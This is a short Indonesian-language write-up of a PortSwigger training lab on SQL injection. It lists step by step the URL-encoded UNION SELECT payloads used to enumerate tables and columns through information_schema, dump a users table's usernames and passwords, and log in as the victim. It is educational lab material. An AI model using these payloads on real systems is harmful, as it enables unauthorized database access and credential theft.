# SQL injection attack, listing the database contents on non-Oracle databases

Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

### Jawaban

1. Melakukan `ORDER BY` untuk menemukan berapa jumlah column untuk request filter category dan ditemukan saat `'ORDER BY 3--` terjadi error maka columnnya berjumlah 2
<img width="1999" height="605" alt="image" src="https://github.com/user-attachments/assets/523c680a-412f-40c2-bbb2-288c6d03b110" />

2. Mencari nama database dengan `%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` dan menentukan tabel mana yang sekiranya menyimpan username dan password
<img width="1967" height="1425" alt="image" src="https://github.com/user-attachments/assets/000c6d50-ff9d-4580-9220-52d9372d225d" />

3. Mencari nama kolom dari tabel `users_pokpfj` dengan `%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_pokpfj%27--`
<img width="2007" height="1316" alt="image" src="https://github.com/user-attachments/assets/41154c72-a097-433e-8bd0-ba58d3d78178" />

4. Mencari username dan password dengan `%27+UNION+SELECT+username_awycrk,+password_yxlnsq+FROM+users_pokpfj--`
<img width="2209" height="771" alt="image" src="https://github.com/user-attachments/assets/3d71879a-f4ba-4bf7-a1e4-38ce0a0cf55c" />

5. Login menggunakan username dan password yang didapatkan
<img width="2308" height="1105" alt="image" src="https://github.com/user-attachments/assets/3d4e13a0-acb9-4077-9c02-cb0d93a930df" />
